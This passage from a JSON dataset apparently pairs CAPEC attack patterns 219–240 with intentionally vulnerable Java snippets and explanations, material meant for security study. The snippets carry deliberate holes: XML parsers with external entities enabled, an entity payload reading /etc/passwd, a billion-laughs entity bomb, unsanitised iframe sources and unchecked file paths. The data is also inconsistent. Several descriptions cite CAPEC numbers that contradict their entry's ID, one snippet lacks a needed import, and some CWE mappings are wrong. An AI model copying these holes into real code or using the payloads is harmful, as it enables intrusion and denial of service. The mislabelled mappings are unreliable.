IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker could spoof a UDDI or ebXML message to impersonate a service provider in an e-business transaction. The code reads an XML file from an untrusted source without validating it against a schema (CWE-112). It then extracts business information and attempts to connect to a specified WSDL URL without verifying the authenticity of the data (CWE-345). The destination URL is used directly from the untrusted XML, which could be incorrect (CWE-941). The code does not ensure the integrity of the message during transmission (CWE-924) and does not verify the identity of the endpoint (CWE-300). This could lead to disclosure of sensitive information, loss of message integrity, or financial fraud, as described in the CAPEC."
    },
    {
        "capec_id": "219",
        "capec_name": "XML Routing Detour Attacks",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.ParserConfigurationException;\nimport javax.xml.transform.Transformer;\nimport javax.xml.transform.TransformerException;\nimport javax.xml.transform.TransformerFactory;\nimport javax.xml.transform.dom.DOMSource;\nimport javax.xml.transform.stream.StreamResult;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\nimport org.xml.sax.SAXException;\nimport java.io.File;\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class XMLRoutingDetour {\n    public static void main(String[] args) {\n        try {\n            // Load XML file\n            File inputFile = new File(\"input.xml\");\n            DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();\n            Document doc = dBuilder.parse(inputFile);\n            doc.getDocumentElement().normalize();\n\n            // Extract routing information (vulnerable to CWE-610)\n            String routingURL = doc.getElementsByTagName(\"routingURL\").item(0).getTextContent();\n\n            // Send XML to routing URL (vulnerable to CAPEC-94)\n            URL url = new URL(routingURL);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setDoOutput(true);\n            conn.setRequestMethod(\"POST\");\n            TransformerFactory transformerFactory = TransformerFactory.newInstance();\n            Transformer transformer = transformerFactory.newTransformer();\n            DOMSource source = new DOMSource(doc);\n            StreamResult result = new StreamResult(conn.getOutputStream());\n            transformer.transform(source, result);\n\n            // Read response (vulnerable to CWE-441)\n            if (conn.getResponseCode() == 200) {\n                System.out.println(\"Successfully routed XML.\");\n            } else {\n                System.out.println(\"Failed to route XML.\");\n            }\n        } catch (ParserConfigurationException | SAXException | IOException | TransformerException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML routing process, embodying the main idea of CAPEC-94 (XML Routing Detour Attacks). The code reads an XML file, extracts a routing URL from it, and sends the XML content to that URL. The vulnerabilities include: CWE-610 (Externally Controlled Reference to a Resource in Another Sphere) where the routing URL is extracted from the XML and used without validation, CWE-441 (Unintended Proxy or Intermediary) where the system acts as an intermediary without preserving the original source, and the overall concept of CAPEC-94 where an attacker could compromise the routing URL to detour the XML processing to a malicious endpoint."
    },
    {
        "capec_id": "220",
        "capec_name": "Client-Server Protocol Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableClientServer {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket(\"localhost\", 8080);\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n\n        // Weak algorithm selection (CWE-757)\n        String algorithm = \"MD5\"; // Not the strongest available\n        out.writeUTF(algorithm);\n\n        // Client-side enforcement of server-side security (CWE-602)\n        String clientSecurityToken = \"clientToken123\";\n        out.writeUTF(clientSecurityToken);\n\n        // Capture-replay vulnerability (CWE-294)\n        String authMessage = \"AUTH user:password\";\n        out.writeUTF(authMessage);\n\n        // Incorrectly specified destination (CWE-941)\n        String destination = \"http://malicious.com\";\n        out.writeUTF(destination);\n\n        // Direct use of sockets (CWE-246)\n        out.writeUTF(\"Direct socket communication\");\n\n        // Read server response\n        String response = in.readUTF();\n        System.out.println(\"Server response: \" + response);\n\n        // Close connections\n        in.close();\n        out.close();\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable client-server communication scenario embodying the main idea of CAPEC-272: Client-Server Protocol Manipulation. The code includes several weaknesses: \n1. **Algorithm Downgrade (CWE-757)**: The client selects a weak algorithm (MD5) for communication, which is not the strongest available.\n2. **Client-Side Enforcement of Server-Side Security (CWE-602)**: The client sends a security token to the server, relying on the client to enforce security measures.\n3. **Capture-Replay Vulnerability (CWE-294)**: The client sends an authentication message that could be captured and replayed by an attacker.\n4. **Incorrectly Specified Destination (CWE-941)**: The client specifies a potentially malicious destination URL.\n5. **Direct Use of Sockets (CWE-246)**: The client directly uses sockets for communication instead of using higher-level framework methods.\n\nThis code highlights how weaknesses in protocol design and implementation can be exploited, leading to potential security vulnerabilities."
    },
    {
        "capec_id": "221",
        "capec_name": "Data Serialization External Entities Blowup",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.File;\n\npublic class XMLExternalEntityExample {\n    public static void main(String[] args) {\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false);\n            dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", true);\n            dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", true);\n            dbf.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", true);\n\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            Document doc = db.parse(new File(\"example.xml\"));\n\n            System.out.println(\"XML parsed successfully\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to 'Data Serialization External Entities Blowup' (CAPEC). The code uses the DocumentBuilderFactory to parse an XML file without properly restricting external entity references. The features 'external-general-entities', 'external-parameter-entities', and 'load-external-dtd' are enabled, which allows the XML parser to process external entities. This can be exploited by an attacker to include external resources that consume a large amount of resources, leading to a denial of service (DoS) condition. The code also touches on related CWEs such as 'Improper Restriction of XML External Entity Reference' (CWE-611) and 'Improper Control of Resource Identifiers' (CWE-99) by not properly handling external entities and resource identifiers."
    },
    {
        "capec_id": "222",
        "capec_name": "iFrame Overlay",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<iframe src='\" + userInput + \"'></iframe>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to the 'iFrame Overlay' attack described in the CAPEC. The servlet takes user input from a request parameter and directly embeds it into an iframe's src attribute without proper validation or sanitization. This can lead to several security issues:\n\n1. **Improper Restriction of Rendered UI Layers or Frames (CWE-1021)**: The code does not restrict the iframe source, allowing potentially malicious content to be loaded from an untrusted domain.\n2. **Cross-site Scripting (CWE-79)**: The user input is not sanitized, which could allow an attacker to inject malicious scripts.\n3. **User Interface (UI) Misrepresentation of Critical Information (CWE-451)**: The iframe can be used to mislead users into interacting with a malicious interface that appears legitimate.\n4. **Improper Neutralization of Script in Attributes of IMG Tags in a Web Page (CWE-82)**: Although this specific example uses an iframe, similar issues can arise with other HTML elements like IMG tags if user input is not properly sanitized.\n\nThe code represents the main idea of the CAPEC by showing how an attacker can exploit improper handling of user input to create an iframe overlay attack, leading to potential user confusion and security breaches."
    },
    {
        "capec_id": "224",
        "capec_name": "Fingerprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class FingerprintingExample {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n            connection.disconnect();\n\n            // Print server information (vulnerable to fingerprinting)\n            System.out.println(\"Server: \" + connection.getHeaderField(\"Server\"));\n            System.out.println(\"Content-Type: \" + connection.getHeaderField(\"Content-Type\"));\n            System.out.println(\"Content: \" + content.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of fingerprinting a web server. The code makes an HTTP GET request to a specified URL and prints out the 'Server' and 'Content-Type' headers, along with the response content. This information can be used by an adversary to identify the server software and version, which can then be used to discover potential vulnerabilities. The code embodies the main idea of CAPEC-170 (Fingerprinting) by exposing sensitive system information (CWE-497) and potentially allowing an unauthorized actor to gather details about the target system (CWE-200)."
    },
    {
        "capec_id": "226",
        "capec_name": "Session Credential Falsification through Manipulation",
        "code_snippet": "import javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\npublic class VulnerableSessionHandler {\n    public void handleRequest(HttpServletRequest request, HttpServletResponse response) {\n        HttpSession session = request.getSession();\n        Cookie[] cookies = request.getCookies();\n        String sessionId = null;\n\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (cookie.getName().equals(\"JSESSIONID\")) {\n                    sessionId = cookie.getValue();\n                    break;\n                }\n            }\n        }\n\n        if (sessionId != null) {\n            // Vulnerable: No validation of the session ID\n            session = request.getSession(false);\n            if (session == null) {\n                session = request.getSession(true);\n                session.setAttribute(\"user\", \"authenticatedUser\");\n            }\n        }\n\n        // Vulnerable: No session expiration handling\n        response.addCookie(new Cookie(\"JSESSIONID\", session.getId()));\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable session handling mechanism in a web application. The code retrieves the session ID from cookies without validating its integrity (CWE-565). It then uses this session ID to either retrieve an existing session or create a new one without invalidating any existing session identifier (CWE-384). Additionally, the code does not handle session expiration properly, allowing old session credentials to be reused (CWE-613). This setup can be exploited by an attacker to manipulate session credentials and gain unauthorized access to the application, embodying the main idea of CAPEC-61."
    },
    {
        "capec_id": "227",
        "capec_name": "Sustained Client Engagement",
        "code_snippet": "import java.util.concurrent.Executors;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\npublic class ResourceExhaustionExample {\n    private static final int MAX_THREADS = 100;\n    private static final ThreadPoolExecutor executor = (ThreadPoolExecutor) Executors.newFixedThreadPool(MAX_THREADS);\n\n    public static void main(String[] args) {\n        for (int i = 0; i < 1000; i++) {\n            executor.submit(() -> {\n                try {\n                    // Simulate a long-running task\n                    TimeUnit.SECONDS.sleep(10);\n                } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                }\n            });\n        }\n        executor.shutdown();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a scenario where an adversary can cause resource exhaustion by submitting a large number of tasks to a thread pool. The thread pool is configured with a fixed number of threads (MAX_THREADS), but the adversary submits more tasks than the pool can handle concurrently. Each task simulates a long-running operation by sleeping for 10 seconds. This keeps the threads occupied and prevents legitimate users from accessing the resource. This example embodies the CAPEC 'Sustained Client Engagement' by tying up the resource (thread pool) without crashing or flooding it, making it unavailable for legitimate users. The related CWEs are represented as follows: CWE-400 (Uncontrolled Resource Consumption) by submitting excessive tasks, CWE-770 (Allocation of Resources Without Limits or Throttling) by not limiting the number of tasks submitted, and CWE-285 (Improper Authorization) by not checking if the task submission is authorized."
    },
    {
        "capec_id": "228",
        "capec_name": "DTD Injection",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.XMLConstants;\nimport javax.xml.transform.stream.StreamSource;\nimport javax.xml.validation.SchemaFactory;\n\npublic class DTDInjectionExample {\n    public static void main(String[] args) {\n        String xmlData = \"<?xml version=\\\"1.0\\\"?>\\n\" +\n                        \"<!DOCTYPE root [\\n\" +\n                        \"<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">\\n\" +\n                        \"]>\\n\" +\n                        \"<root>&xxe;</root>\";\n\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n            dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false);\n            dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", true);\n            dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", true);\n            dbf.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", true);\n\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            Document doc = db.parse(new InputSource(new StringReader(xmlData)));\n\n            System.out.println(doc.getDocumentElement().getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a DTD Injection vulnerability. The XML data contains a malicious DTD that attempts to read the contents of the '/etc/passwd' file using an external entity. The DocumentBuilderFactory is configured to allow external entities and DTDs, which makes the application vulnerable to DTD Injection attacks. This example highlights the risks associated with improper control of DTDs (CWE-827), inclusion of functionality from untrusted sources (CWE-829), and improper restriction of XML external entity references (CWE-611). The code should be modified to disable external entity processing and DTDs to mitigate these vulnerabilities."
    },
    {
        "capec_id": "229",
        "capec_name": "Serialized Data Parameter Blowup",
        "code_snippet": "import java.io.StringReader;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String xmlData = \"<root>\";\n        for (int i = 0; i < 100000; i++) {\n            xmlData += \"<element>value</element>\";\n        }\n        xmlData += \"</root>\";\n\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document document = builder.parse(new InputSource(new StringReader(xmlData)));\n            System.out.println(\"Parsed XML successfully\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that can be exploited by the 'Serialized Data Parameter Blowup' attack. The code constructs a large XML document with 100,000 repetitive elements and attempts to parse it using a standard XML parser. The parser does not impose any limits on the size or number of elements, leading to excessive CPU resource consumption and potential denial of service (DoS). This example highlights CWE-770 (Allocation of Resources Without Limits or Throttling) as the parser allocates resources without restrictions. Additionally, it touches on CWE-611 (Improper Restriction of XML External Entity Reference) by showing how an XML parser can be misused, although this specific example does not include external entities."
    },
    {
        "capec_id": "230",
        "capec_name": "Serialized Data with Nested Payloads",
        "code_snippet": "import javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.parsers.ParserConfigurationException;\nimport org.xml.sax.InputSource;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\n\npublic class XMLParser {\n    public static void main(String[] args) {\n        String maliciousXML = \"<!DOCTYPE root [<!ENTITY lol 'lol'><!ENTITY lol2 '&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;'><!ENTITY lol3 '&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;'><!ENTITY lol4 '&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;'><!ENTITY lol5 '&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;'><!ENTITY lol6 '&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;'><!ENTITY lol7 '&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;'><!ENTITY lol8 '&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;'><!ENTITY lol9 '&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;'><!ENTITY lol10 '&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;'>]><root>&lol10;</root>\";\n\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(new InputSource(new StringReader(maliciousXML)));\n            System.out.println(\"Parsed XML successfully\");\n        } catch (ParserConfigurationException | SAXException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the CAPEC 'Serialized Data with Nested Payloads'. The code attempts to parse a malicious XML string that contains deeply nested entities. This can lead to excessive memory consumption and CPU utilization, causing a Denial of Service (DoS) attack. The related CWEs are illustrated as follows: CWE-112 (Missing XML Validation) is shown by the lack of schema validation, CWE-20 (Improper Input Validation) is demonstrated by not validating the input XML, CWE-674 (Uncontrolled Recursion) is represented by the deeply nested entities, and CWE-770 (Allocation of Resources Without Limits or Throttling) is shown by the parser consuming resources without any limits. This code highlights the importance of validating and properly handling input data to prevent resource exhaustion attacks."
    },
    {
        "capec_id": "231",
        "capec_name": "Oversized Serialized Data Payloads",
        "code_snippet": "import java.io.ByteArrayInputStream;\nimport java.io.ObjectInputStream;\nimport java.util.Base64;\n\npublic class VulnerableDeserializer {\n    public static void main(String[] args) {\n        String oversizedPayload = \"rO0ABXNyAC5qYXZhLnV0aWwuQXJyYXlMaXN0x81Z8gECAAB4cHcEAAAAAHg=\";\n        try {\n            byte[] data = Base64.getDecoder().decode(oversizedPayload);\n            ByteArrayInputStream bais = new ByteArrayInputStream(data);\n            ObjectInputStream ois = new ObjectInputStream(bais);\n            Object obj = ois.readObject();\n            System.out.println(\"Deserialized object: \" + obj);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to 'Oversized Serialized Data Payloads' (CAPEC-112). The code attempts to deserialize a Base64 encoded string without proper validation or size checks. This can lead to resource exhaustion or arbitrary code execution if an attacker provides a maliciously crafted oversized payload. The code also touches on related CWEs: it does not validate the input (CWE-20), lacks XML validation (CWE-112), does not control recursion (CWE-674), and allocates resources without limits (CWE-770). The reliance on machine-dependent data representation (CWE-1102) is implicit in the deserialization process, which can vary across different environments."
    },
    {
        "capec_id": "233",
        "capec_name": "Privilege Escalation",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class PrivilegeEscalationExample {\n    private boolean isAdmin;\n\n    public PrivilegeEscalationExample(boolean isAdmin) {\n        this.isAdmin = isAdmin;\n    }\n\n    public void writeFile(String filename, String content) throws IOException {\n        if (!isAdmin) {\n            System.out.println(\"Insufficient privileges to write file.\");\n            return;\n        }\n        File file = new File(filename);\n        FileWriter writer = new FileWriter(file);\n        writer.write(content);\n        writer.close();\n    }\n\n    public static void main(String[] args) {\n        try {\n            PrivilegeEscalationExample user = new PrivilegeEscalationExample(false);\n            user.writeFile(\"important.txt\", \"Sensitive data\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple privilege escalation vulnerability. The `PrivilegeEscalationExample` class has a method `writeFile` that checks if the user has admin privileges before allowing them to write to a file. However, the check is performed in a way that can be easily bypassed or manipulated, leading to improper privilege management (CWE-269). The code also does not handle insufficient privileges correctly (CWE-274), as it simply prints a message and returns without any robust error handling or logging. This example embodies the main idea of the CAPEC by showing how an adversary could exploit such weaknesses to perform unauthorized actions."
    },
    {
        "capec_id": "234",
        "capec_name": "Hijacking a privileged process",
        "code_snippet": "import java.io.*;\n\npublic class PrivilegedProcessHijack {\n    public static void main(String[] args) {\n        try {\n            // CWE-250: Execution with Unnecessary Privileges\n            // Running a command with elevated privileges\n            ProcessBuilder pb = new ProcessBuilder(\"/bin/sh\", \"-c\", \"ls /root\");\n            pb.redirectErrorStream(true);\n            Process process = pb.start();\n\n            // CWE-114: Process Control\n            // Reading output from the process\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n\n            // CWE-271: Privilege Dropping / Lowering Errors\n            // Not dropping privileges after performing the task\n            // This leaves the process running with elevated privileges\n\n            process.waitFor();\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a process is executed with elevated privileges, which can be hijacked by an attacker. The code uses `ProcessBuilder` to run a shell command (`ls /root`) that requires root privileges (CWE-250). The output of the command is read and printed, which involves executing commands from an untrusted source (CWE-114). Additionally, the code does not drop privileges after performing the task (CWE-271), leaving the process running with elevated privileges. This embodies the main idea of CAPEC-233, where an adversary can gain control of a privileged process to execute arbitrary code with those privileges."
    },
    {
        "capec_id": "235",
        "capec_name": "DEPRECATED: Implementing a callback to system routine (old AWT Queue)",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    private static String secret = \"SensitiveData\";\n\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ClientHandler(clientSocket)).start();\n        }\n    }\n\n    private static class ClientHandler implements Runnable {\n        private Socket clientSocket;\n\n        public ClientHandler(Socket socket) {\n            this.clientSocket = socket;\n        }\n\n        @Override\n        public void run() {\n            try {\n                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n                String request = in.readLine();\n\n                if (request.equals(\"GET_SECRET\")) {\n                    out.println(secret);\n                }\n\n                clientSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that listens for incoming connections on port 8080. When a client connects, it spawns a new thread to handle the client's request. The server has a static variable 'secret' that holds sensitive data. If the client sends the request 'GET_SECRET', the server responds with the sensitive data.\n\nThe code embodies the main idea of CAPEC:30 - Hijacking a Privileged Thread of Execution, as it demonstrates a multi-threaded environment where sensitive data can be exposed due to improper handling of requests. The related CWE-1058 is represented by the use of a non-final static variable 'secret' in a multi-threaded context, which is unsafe. Additionally, the code is vulnerable to CWE-294 (Authentication Bypass by Capture-replay) because it does not implement any authentication mechanism, allowing an attacker to sniff and replay the 'GET_SECRET' request to obtain the sensitive data."
    },
    {
        "capec_id": "236",
        "capec_name": "DEPRECATED: Catching exception throw/signal from privileged block",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class PrivilegedThreadHijack {\n    public static void main(String[] args) {\n        try {\n            // Simulate privileged operation\n            performPrivilegedOperation();\n        } catch (Exception e) {\n            // CWE-391: Unchecked Error Condition\n            // Ignoring the exception, which could lead to unexpected behavior\n        }\n    }\n\n    private static void performPrivilegedOperation() throws IOException {\n        // CWE-782: Exposed IOCTL with Insufficient Access Control\n        // Simulate an IOCTL operation without proper access control\n        String content = new String(Files.readAllBytes(Paths.get(\"/etc/shadow\")));\n        System.out.println(\"Privileged content: \" + content);\n    }\n\n    // CWE-828: Signal Handler with Functionality that is not Asynchronous-Safe\n    static {\n        Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n            try {\n                // This is not asynchronous-safe\n                Files.write(Paths.get(\"/tmp/shutdown.log\"), \"Shutdown initiated\".getBytes());\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }));\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a privileged operation is performed, but exceptions are not properly handled (CWE-391). The `performPrivilegedOperation` method simulates reading a sensitive file (`/etc/shadow`) without proper access control (CWE-782). Additionally, a shutdown hook is added that performs file I/O operations, which are not asynchronous-safe (CWE-828). This setup can be exploited by an attacker to hijack the privileged thread of execution, as the code does not handle exceptions properly and performs unsafe operations in a signal handler."
    },
    {
        "capec_id": "237",
        "capec_name": "Escaping a Sandbox by Calling Code in Another Language",
        "code_snippet": "public class SandboxEscape {\n    static {\n        System.loadLibrary(\"nativeLib\"); // CWE-111: Direct Use of Unsafe JNI\n    }\n\n    public native void unsafeNativeMethod();\n\n    public static void main(String[] args) {\n        SandboxEscape escape = new SandboxEscape();\n        try {\n            escape.unsafeNativeMethod(); // Attempt to call unsafe native code\n        } catch (Exception e) {\n            System.err.println(\"Error: \" + e.getMessage()); // CWE-537: Java Runtime Error Message Containing Sensitive Information\n        }\n    }\n}\n\n// Corresponding C code (nativeLib.c)\n#include <jni.h>\n#include <stdio.h>\n#include <stdlib.h>\n\nJNIEXPORT void JNICALL Java_SandboxEscape_unsafeNativeMethod(JNIEnv *env, jobject obj) {\n    // CWE-693: Protection Mechanism Failure\n    // CWE-111: Direct Use of Unsafe JNI\n    // Unsafe operation: executing system command\n    system(\"echo 'Escaped the sandbox!'\");\n}",
        "description": "This Java code snippet demonstrates a potential sandbox escape by calling native C code using the Java Native Interface (JNI). The Java class `SandboxEscape` loads a native library (`nativeLib`) and declares a native method `unsafeNativeMethod`. In the `main` method, it attempts to call this native method, which is implemented in C. The C code performs an unsafe operation by executing a system command (`system(\"echo 'Escaped the sandbox!'\")`). This example embodies the main idea of CAPEC-142: 'Escaping a Sandbox by Calling Code in Another Language'. The code also highlights related CWEs: CWE-111 (Direct Use of Unsafe JNI), CWE-537 (Java Runtime Error Message Containing Sensitive Information), and CWE-693 (Protection Mechanism Failure)."
    },
    {
        "capec_id": "238",
        "capec_name": "DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String url = request.getParameter(\"url\");\n        if (isAuthorized(request)) {\n            // Authorization check before URL parsing\n            if (url.contains(\"..\")) {\n                response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Unauthorized access\");\n                return;\n            }\n            // Potentially dangerous operation\n            response.sendRedirect(url);\n        } else {\n            response.sendError(HttpServletResponse.SC_UNAUTHORIZED, \"User not authorized\");\n        }\n    }\n\n    private boolean isAuthorized(HttpServletRequest request) {\n        // Dummy authorization check\n        String user = request.getParameter(\"user\");\n        return \"admin\".equals(user);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability where authorization is checked before URL parsing and canonicalization, which can lead to bypassing authorization protections (CWE-551). The `doGet` method first checks if the user is authorized and then attempts to parse the URL. If the URL contains directory traversal sequences (e.g., '..'), it sends a forbidden error. However, because the authorization check occurs before URL parsing, an attacker could potentially craft a URL that bypasses the authorization check. This snippet also reflects other weaknesses such as insufficient isolation of symbolic constants (CWE-1107) by hardcoding the 'admin' user check, and improper protection of alternate paths (CWE-424) by not fully securing the URL redirection logic."
    },
    {
        "capec_id": "239",
        "capec_name": "DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server started on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String clientMessage = in.readLine();\n            if (clientMessage.equals(\"AUTHENTICATE\")) {\n                out.println(\"Authenticated\");\n            } else {\n                out.println(\"Access Denied\");\n            }\n\n            // Client-side enforcement of server-side security\n            if (clientMessage.equals(\"GET_SECRET_DATA\")) {\n                out.println(\"Secret Data: 12345\");\n            }\n\n            clientSocket.close();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that embodies the main idea of the deprecated CAPEC and related CWEs. The server listens on port 8080 and accepts client connections. It performs a simple authentication check based on a client message. If the client sends 'AUTHENTICATE', the server responds with 'Authenticated'. However, the server also contains a critical flaw: it relies on the client to enforce security. If the client sends 'GET_SECRET_DATA', the server responds with sensitive information ('Secret Data: 12345') without verifying the client's authentication status. This demonstrates CWE-602 (Client-Side Enforcement of Server-Side Security) and CWE-603 (Use of Client-Side Authentication), where the server's security mechanisms can be bypassed by a modified client that omits the authentication check."
    },
    {
        "capec_id": "240",
        "capec_name": "Resource Injection",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class ResourceInjectionExample extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"file\");\n        \n        // Vulnerable code: No validation on the file name\n        File file = new File(\"/var/www/files/\" + fileName);\n        \n        if (file.exists() && !file.isDirectory()) {\n            BufferedReader reader = new BufferedReader(new FileReader(file));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.getWriter().println(line);\n            }\n            reader.close();\n        } else {\n            response.getWriter().println(\"File not found.\");\n        }\n    }\n}",
